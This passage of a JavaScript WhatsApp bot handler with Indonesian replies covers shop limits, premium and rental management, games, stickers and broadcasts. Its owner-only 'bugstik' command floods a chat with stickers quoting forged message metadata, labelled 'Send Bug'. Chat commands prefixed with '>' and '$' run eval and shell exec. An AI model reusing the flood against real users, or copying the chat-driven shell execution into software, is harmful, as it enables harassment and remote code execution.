	//setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}\nLimit Game : ${db.data.users[sender].glimit}/${gcount}\nSaldo : Rp ${db.data.users[sender].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit\nAtau ketik .buyprem untuk membeli unlimited limit`)
	}
	break
	
	
	case 'buylimit':{
	if (!q) return setReply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = Rp1000`)
	if (q.includes('-')) return setReply(`Jangan menggunakan -`)
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	let ane = Number(math(q) * 1000)
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
	db.data.users[sender].balance -= ane
	db.data.users[sender].limit += math(q)
	setReply(`Pembeliaan limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].limit}/${limitCount}`)
	}
	break
	
	case 'claim':
	case 'daily':{
	const limi = ['2','4','1','5','9','3','8','7','6','10','11']
    const randomny = limi[Math.floor(Math.random() * limi.length)]
	const limitfree = randomny
	const free = 3000
	const prem = 10000
	const moneyfree = 3000
	const moneyprem = 10000
	const timeout = 86400000
	let time = global.db.data.users[m.sender].lastclaim + 86400000
	 if (new Date - global.db.data.users[m.sender].lastclaim < 86400000) return setReply( `Anda sudah mengklaim, klaim harian hari ini\ntunggu selama ${conn.msToTime(time - new Date())} lagi`)
	 global.db.data.users[m.sender].exp += isPremium ? prem : parseInt(free)
     global.db.data.users[m.sender].limit += parseInt(limitfree)
	 global.db.data.users[m.sender].balance += isPremium ? moneyprem : moneyfree
	setReply(`Selamat kamu mendapatkan:\n\n+${limitfree} Limit\n+${isPremium? prem : free} Exp\n+${isPremium? moneyprem : moneyfree} Balance`)
	global.db.data.users[m.sender].lastclaim = new Date * 1
	} 
	break 
	
	
	
	case 'shop':{
	let teks = `
	*]────「 SHOP」────[*
	
	Halo ${pushname} 
	Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}
	
	• List Harga
	1 Limit : Rp 1000
	1 Limit Game : Rp 700
	
	NOTE :
	Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
	Contoh : ${prefix}buylimit 10
	
	Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
	Contoh : ${prefix}buyglimit 10
 
Atau ketik .buyprem untuk membeli unlimited limit`
	setReply(teks)
	}
	break 
	
	case 'banuser':
	if (!isOwner) return setReply(mess.only.Bowner)
	if(!q) return setReply(`Masukan Id whatsapp`)
	let nama = await conn.getName(q)
	if(db.data.users[sender].banned.status) return setReply('Done')
	if(!db.data.users[sender].banned.status) db.data.users[sender].banned.status = true              
	teks =`
	Kamu telah di banned karena
	menyalahgunakan Fitur _*reportbug*_
	
	Nama: ${nama}
	Nomer: ${q.split("@")[0]}
	Tanggal: ${calender}
	Total Banned : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}
	
	${copyright}`
	await conn.sendMessage(q,{text: teks})
	
	break
	
	case 'addprem':
		if (!isOwner) return onlyOwner()
		
		if (mentionByReply && isGroup) {
		if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)      
		 //if(_prem.checkPremiumUser (mentionByReply, premium)) return setReply("User tersebut sudah di premium")   
		_prem.addPremiumUser (mentionByReply, q, premium)         
		 setReply(`Succes add premium ${mentionByReply.split("@")[0]}`)
		conn.sendText(mentionByReply, `Halo kak aku *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}\n\nSilahkan ketik .cekprem untuk melihat expired premium kamu`)
		 } else if(mentionByTag && isGroup) { 
		let waktu = q.split(" ")[1]
		 //if(_prem.checkPremiumUser (mentionByTag, premium)) return setReply("User tersebut sudah di premium kak")   
		_prem.addPremiumUser (mentionByTag, waktu, premium)         
		await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
		conn.sendText(mentionByTag, `Halo kak aku *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}\n\nSilahkan ketik .cekprem untuk melihat expired premium kamu`)
		   } else if(!isGroup){
		let usernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
		let waktunya = q.split("|")[1]
		
		// if(_prem.checkPremiumUser (usernya, premium)) return setReply("User tersebut sudah di premium kak")   
		_prem.addPremiumUser (usernya, waktunya, premium)         
		await setReply(`Succses, silakan ketik ${prefix}listprem untuk melihat list premium`)
		conn.sendText(usernya, `Halo kak aku *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}\n\nSilahkan ketik .cekprem untuk melihat expired premium kamu`)
		   } else setReply("Tag atau Reply usernya")
		break
		
		case 'cekprem': case 'cekpremium':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
			let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
			let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
setReply(premiumnya)
			  break
	  
	
	
	 case 'delprem':
	if (!isOwner) return onlyOwner()
	if(Input){
	 if(!_prem.checkPremiumUser (Input, premium)) return setReply("Maap kak user tersebut tidak ada di database") 
	_prem.delPremiumUser (Input, premium)
	setReply(`Succes delete premium ${Input.split("@")[0]}`)          
	   
	} else setReply("Tag/Reply/Input nomer target")
	break
	
	
	  

	
	
	case 'inspect':{
	const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
	let code = q.match(rex1);
	if (code === null) return  setReply("No invite url detected.");
	code = code[0].replace("chat.whatsapp.com/", "");
	let nana = await conn.groupGetInviteInfo(code)
	//console.log(nana)
	
	  
	let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(code).catch(async () => {
	return setReply("Invalid invite url.");
	});
	let text =
	`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
	Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
	setReply(text)
	
	}
	break
	
	
	
	
	case 'restart':
	if (!isOwner && !itsMe) return setReply(mess.only.owner)
	await setReply(`_Restarting ${fake}_`)
	await conn.sendMessage(from, {text: "_Succes_"})
	await sleep(3000)
	process.send('reset') 
	break
	
	
	
	case  'shutdown':
	if (!isOwner && !itsMe) return setReply(mess.only.owner)
	try{
	await conn.sendMessage(from, {text: "_Shuting Down..._"})
	await sleep(3000)
	await conn.sendMessage(from, {text: "_Succes_"})
	exec(`pm2 stop index.js`)
	return await conn.sendMessage(from, JSON.stringify(eval(process.exit())))  
	}catch{
	return await conn.sendMessage(from, JSON.stringify(eval(process.exit())))  
	}
	break
	
	
	case 'addsewa':{
	 if(!isGroup){
	const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
	let LinkGc = q.split(" ")[0];
	let Second = q.split(" ")[1];
	  let code = LinkGc.match(rex1);
	if (code == null) return  setReply("No invite url detected.");
	
	let kode = code[0].replace("chat.whatsapp.com/", "");
	await conn.groupAcceptInvite(kode)
	let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(kode).catch(async () => {
	return setReply("Invalid invite url.");
	});
	setReply(`Sukses`)
	
	await _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
	} else if(isGroup){
	if(!q) return setReply("Maukian angka 1m/1d/1h")
	if (isBotGroupAdmins) {
	let linkgc = await conn.groupInviteCode(from)
	var yeh = `https://chat.whatsapp.com/${linkgc}`
	} else if(!isBotGroupAdmins){
	var yeh = `Botz Is Not Admin`
	} 
	_sewa.addSewaGroup(from, groupName, yeh, q, sewa)
	setReply("Berhasil Add Sewa ke group")
	}
	}
	break
	
	case 'listsewa': 
	let ordernye = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
	for (let i of sewa){
	let cekvipp = ms(i.expired - Date.now())
	ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
	 } 
	ordernye += `© ${fake1}`
	setReply(ordernye)
	break
	
	
	case 'ceksewa': 
	case 'sewacek':
	if (!isGroup) return setReply(mess.only.group)
	if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
	let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
	let sewenye = `「 *SEWA EXPIRE* 」
	*Group*: ${groupName}
	*ID*: ${from}
	*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
	setReply(sewenye)
	break
	
	
	 case 'sewalist': 
	case 'listsewa':
	let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
	for (let i of sewa){
	let cekvipp = ms(i.expired - Date.now())
	txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
	} 
	txtnyee += `© ${fake1}`
	setReply(txtnyee)
	break 
	
	
	
	
	
	
	case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return setReply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
	if(filteredArray.length == 0) return setReply(teks)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	setReply(teks) 
	
//	await sleep(2000)
	setReply("Menghapus file sampah...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	setReply("Berhasil menghapus semua sampah")
	 
	});
	  }
	break
	
	
	
  case 'tf': case 'transfer':{
    try{
    if (!isGroup) return setReply(mess.only.group)
	if(!q) return setReply(`Masukan angka\nContoh: .transfer 100`)
      if(mentionByReply.includes(botNumber)) return reply ('Tidak bisa transfer ke nomor bot')
if(mentionByReply.includes(sender)) return reply ('Tidak bisa transfer ke nomor sendiri')
   if(!mentionByReply) return setReply("Reply targetnya")
         if(budy.includes('-') || budy.includes('+')) return setReply ("Harus angka blok")
	if (isNaN(q)) return setReply(`Masukan angka\nContoh: .transfer 100`)
	
	let ane = q
      if(100 > ane) return reply('Minimal transaksi 100 rupiah')
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi`)
    	db.data.users[mentionByReply].balance += parseInt(ane)
	db.data.users[sender].balance -= parseInt(ane)
	setReply(`Berhasil mentransfer saldo ke nomer ${mentionByReply.split("@")[0]} sebesar Rp.${Number(q).toLocaleString()}`)
	}catch(err){
      setReply ('User tersebut belum terdaftar di database bot, silahkan suruh ketik .menu terlebih dahulu')
  }
  }
	break
	
	
	  
	case 'setimgquoted':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/quoted.jpg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah image quoted`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix+command}`);
	}
	}
	break;
	
	case 'ttp':{
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
		localFontPath: 'src/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'white',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "black",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: packName, // The pack name
		author: authorName, // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
	
	
	
	case 'tts':{
	if(isText) {
	function tts(text, lang = 'id') {
	// console.log(lang, text)
	return new Promise((resolve, reject) => {
	try {
	let tts = gtts(lang)
	let filePath =  (1 * new Date) + '.mp3'
	tts.save(filePath, text, () => {
	resolve(fs.readFileSync(filePath))
	fs.unlinkSync(filePath)
	})
	} catch (e) { reject(e) }
	})
	}
	
	const defaultLang = 'id'
	
	
	let lang = args[0]
	let text = args.slice(1).join(' ')
	if ((args[0] || '').length !== 2) {
	lang = defaultLang
	text = args.join(' ')
	}
	if (!text && m.quoted?.text) text = m.quoted.text
	
	let ras
	try { ras = await tts(text, lang) }
	catch (e) {
	m.reply(e + '')
	text = args.join(' ')
	if (!text) setReply( `Use example ${prefix}${command} en hello world`)
	ras = await tts(text, defaultLang)
	} finally {
	if (ras) conn.sendMedia(from, ras, dev, {caption: "Nih"})
	//conn.sendFile(m.chat, res, 'tts.opus', null, m, true)
	}
	} else {
	reply( `Invalid\nContoh: ${prefix + command} id Hallo apa kabar`  )           
	}
	}
	break
	
	

	
case 'bugstik':{
if (!isOwner) return onlyOwner()
if (args.length == 0) return setReply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku bot wea`
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(from, {sticker: './stik/thumb.jpeg'},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
setReply (`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
	
	

	
	
	
	
	case 'antidelete':{
	if (!isGroup) return setReply('Kusus group')
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntidelete) return setReply("Sudah aktif!!");
	db.data.chats[from].antidelete = true
	setReply("Sukses mengaktifkan antidelete!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntidelete) return setReply("Udah off!!");
	db.data.chats[from].antidelete = false
	setReply("Sukses mematikan antidelete!");
	} else if (!q) {
		reply ( `*MODE ANTI DELETE*\n ${prefix+command} on/off`)
	 }
	 }
	break
	
	 
	 case 'afk':{
	 let user = global.db.data.users[m.sender]
	 user.afk = + new Date
	 user.afkReason = q
	 setReply(`${pushname} telah AFK dengan alasan ${q ? ': ' + q : 'Nothing'}`)
	}
	break
	
	case 'listblock':{
	let block = await conn.fetchBlocklist()            
	setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
	}
	break 
	
	case 'listprem':{
		let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
		let men = [];
		for (let i of premium){
		men.push(i.id)
		let cekvip = ms(i.expired - Date.now())
		txt += `*ID :* ${i.id}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
		}
		mentions(txt, men, true)
		}
		break
	
	case 'caklontong':{
  if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 3000
	let tiketcoin = 1500
	let id = m.chat
	if (id in conn.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	${json.soal}
	
	Timeout *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Balance: +${tiketcoin} Money
	`.trim()
	conn.caklontong[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	user.balance -= 200
reply(`*GAME CAK LONTONG*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.caklontong[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
	
	case 'family100': {
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let winScore = 1000
  let timeot = 200000  
  let timeout = 80000
	let id = m.chat
	if (id in conn.family) return setReply('Masih ada kuis yang belum terjawab di chat ini') 
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `*GAME FAMILY100*
	
	*Soal:* ${json.soal}

	Terdapat ${json.jawaban.length} jawaban${json.jawaban.find(v => v.includes(' ')) ? `
	(beberapa jawaban terdapat spasi)
	`: ''}
	
	+${winScore} Money tiap jawaban benar

		`.trim()
		conn.family[id] = {
			id,
      
			msg: await m.reply(caption),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }

  
	}
    db.data.users[sender].glimit -= 1
	break
	
	
	
	
	
	
	

	
	

	
	case 'sfile': {
		async function sfileSearch(query, page = 1) {
		let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
		let $ = cheerio.load(await res.text())
		let result = []
		$('div.list').each(function () {
			let title = $(this).find('a').text()
			let size = $(this).text().trim().split('(')[1]
			let link = $(this).find('a').attr('href')
			if (link) result.push({ title, size: size.replace(')', ''), link })
		})
		return result
	}
	
	async function sfileDl(url) {
		let res = await fetch(url)
		let $ = cheerio.load(await res.text())
		let filename = $('div.w3-row-padding').find('img').attr('alt')
		let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
		let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
		let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
		return { filename, filesize, mimetype, download }
	}
		
		if (q.match(/(https:\/\/sfile.mobi\/)/gi)) {
			let res = await sfileDl(q)
			if (!res) return setReply('Error :/')
			await setReply(Object.keys(res).map(v => `*• ${v}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
			conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
		} else if (q) {
			let [query, page] = q.split`|`
			let res = await sfileSearch(query, page)
			if (!res.length) return setReply( `Query "${text}" not found :/`)
			rus = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
			setReply(rus)
		} else return setReply( 'Input Query / Sfile Url!')
	}
	break

case  'bcgctext':{
if(!q) return reply ('Teksnya bwng')
   reply(mess.wait)
const id = [];
let data = await conn.groupFetchAllParticipating()
const mention = Object.values(data)
  .flatMap(group => group.participants)
  .map(participant => participant.id);

for (const key in data) {
  id.push(data[key].id);
}
for(let jid of id){
await sleep (4000)
conn.sendMessage(jid, {caption: `⎚ *_BROADCAST ELAINA_*\n\n𖦹 *Pesanya:*\n${q}\n\n© By ${global.botName}`,image: fs.readFileSync('./stik/bcgc.jpeg'), mentions: mention})
}
reply('Sukses')
}
break                              
case  'remini':    
case  'hd':
case 'hd':
case  'remini':
case  'tohd':{
if (isImage || isQuotedImage) {
setReply(mess.wait)
const media = await conn.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh(media)
await 
conn.sendMessage(m.chat, { image: { url: `https://xzn.wtf/api/torch-srgan?url=${anu}&apikey=${apiwtf}` }, caption: `*Sukses membuat Hd*` }, { quoted: m})
} else {
reply(`Kirim/Reply gambar dengan Caption ${prefix + command}\n`);
}
}
break
    
case  'setimagebc':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/bcgc.jpeg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah thumbnail`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix}setimagebc`);
	}
	}
	break
//=================================================================================================
    

default:
if (isCmd) {
await Nothing(toFirstCase(command), dash, allcommand)
const stringSimilarity = require("string-similarity");
let matches = await stringSimilarity.findBestMatch(toFirstCase(command), allcommand)
setReply(`Command *${prefix+command}* tidak ditemukan\nMungkin yang kamu maksud adalah *${prefix+matches.bestMatch.target.toLowerCase()}*`)
} 
} //Akhir switch command



  if (budy.startsWith('>') || budy.startsWith('=>') ){
          if(!isOwner) return reply('Khsus Owner')
         // if(!m.key.fromMe) return;
          const syntaxerror = require ("syntax-error")
          var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
          try {
            var yo = util.format(await eval(`(async()=>{ ${arg} })()`))
            conn.sendMessage(from, {text: yo }, { quoted: dev })
          } catch (e) {
            let _syntax = ""
            let _err = util.format(e)
            let err = syntaxerror(arg, "EvalError", {
              allowReturnOutsideFunction: true,
              allowAwaitOutsideFunction: true,
              sourceType: "module"
            })
            if (err) _syntax = err + "\n\n"
            conn.sendMessage(from, { text: util.format(_syntax + _err) }, { quoted: dev })
          }
}

  if(budy.startsWith('$')){
          if(!isOwner) return reply('KhsusOwner')
          try {
            exec(args.join(" "), function(er, st) {
              if (er) conn.sendMessage(from, { text:"```"+ util.format(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))+"```"}, {
                quoted: m
              })
              if (st) conn.sendMessage(from, { text: "```"+util.format(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))+"```" }, {
                quoted: m
              })
            })
          } catch (e) {
            console.warn(e)
          }
              }

  


 
if (!isGroup && isImage && autoSticker) {
try{
let WSF = require('wa-sticker-formatter')
let wsf = false
let mime = (dev.msg || dev).mimetype || ''
if (/image/.test(mime)) {
let img = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
wsf = new WSF.Sticker(img, {
pack: packName,
type: WSF.StickerTypes.FULL,
author: authorName,
crop: true,
})
}        
  
if (wsf) {
await wsf.build()
const sticBuffer = await wsf.get()
  //await sleep(3000)    
if (sticBuffer) await conn.sendMessage(from, { sticker: sticBuffer }, {quoted: dev, mimetype: 'image/webp'}) 
//await fs.unlinkSync(sticBuffer)
}
}catch(err){
}
}
    
//ketika ada yang invite/kirim link grup di chat pribadi
//Di kasih ama Alyul
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini')) && !m.isBaileys && !isGroup && !itsMe && !isOwner) {
let teks = dada(prefix, pushname, ucapanWaktu)      
reply (teks)
}


//Jika ada yg cek prefix bot akan merespon   
if (budy.includes('ekprefix')){
if (cekSpam("NotCase",senderNumber, AntiSpam)) return
addSpam("NotCase",senderNumber, "10s", AntiSpam)
conn.sendMessage(from,{text:  `Baik kak untuk prefix saat ini adalah : 「  ${thePrefix}  」`}, { quoted: dev })
 }

//Jika ada yg kirim pesan "Asalamualaikun" botz akan respon✓
if (budy.includes(`ualaikum`) || budy.includes(`u'alaikum`) ) { 
if (cekSpam("NotCase",senderNumber, AntiSpam)) return 
addSpam("NotCase",senderNumber, "10s", AntiSpam)
setReply("Walaikumsalam kak")
}

                                 


} catch (err){
 console.log(err)
//add to dashboard
if(isCmd) Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan install terlebih dahulu`
return await conn.sendText(dev.key.remoteJid, teks, dev)
}
await conn.sendText(Ownerin, `]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`, dev) 
if(checkError(err.message, db.data.listerror)) return
addError(err.message, command, db.data.listerror)
if(autoblockcmd){        
addblockcmd(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`

conn.sendText(Ownerin, teks, dev)

if(!autoblockcmd){
//await conn.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await conn.sendMedia (Ownerin, media, dev, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		



  
} catch (err){
console.log(chalk.bgRed(color("[  ERROR  ]", "black")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(color('Message Error : %s', 'white'), color(util.format(e), 'green'))
if(Console){
conn.sendMessage(Ownerin, {text : util.format(e)})
}
//console.log(e)
}
}

       
    
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(color("[  UPDATE ]", "black")),chalk.white(`${__filename}`) )
delete require.cache[file]
require(file)
})

